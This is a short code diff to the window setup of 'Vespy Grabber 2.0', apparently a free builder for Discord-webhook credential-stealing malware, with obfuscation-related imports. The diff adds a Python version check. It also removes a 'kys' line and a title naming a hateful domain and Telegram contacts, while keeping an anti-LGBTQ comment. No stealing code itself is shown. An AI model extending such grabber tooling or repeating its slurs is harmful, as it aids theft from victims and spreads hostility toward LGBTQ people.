@@ -1,6 +1,5 @@
-# If you dont like how I code, idgaf, kys - vesper & NTX
 # We do not svpp0rt LGBTQ
-import os, webbrowser, requests, processplatform, random, string, base64, marshal, pickle, zlib, shutil, codecs, lzma
+import os, webbrowser, requests, processplatform, random, string, base64, marshal, pickle, zlib, shutil, codecs, lzma, sys, time
 from time import sleep
 from PIL import ImageTk, ImageSequence
 from tkinter import *
@@ -10,8 +9,16 @@ from tkinter import messagebox
 from discord_webhook import DiscordWebhook, DiscordEmbed
 from tkinter.filedialog import askopenfilename
 
+#you can bypass this python version filter by deleting line 14 to line 19 but the building will not work without python 3.9.5
+
+verzz = sys.version[0:5]
+if verzz != "3.9.5":
+    print("Invalid python version, please install python 3.9.5 (https://www.python.org/downloads/release/python-395/)")
+    time.sleep(10000)
+else:
+    pass
 window = Tk()
-window.title("[FREE] Vespy Grabber 2.0 || fuck-lgbtq.com || t.me/fccvesper, @i_might_be_vesper")
+window.title("[FREE] Vespy Grabber 2.0")
 window.geometry("744x447")
 window.maxsize(744, 447)
 window.minsize(744, 447)
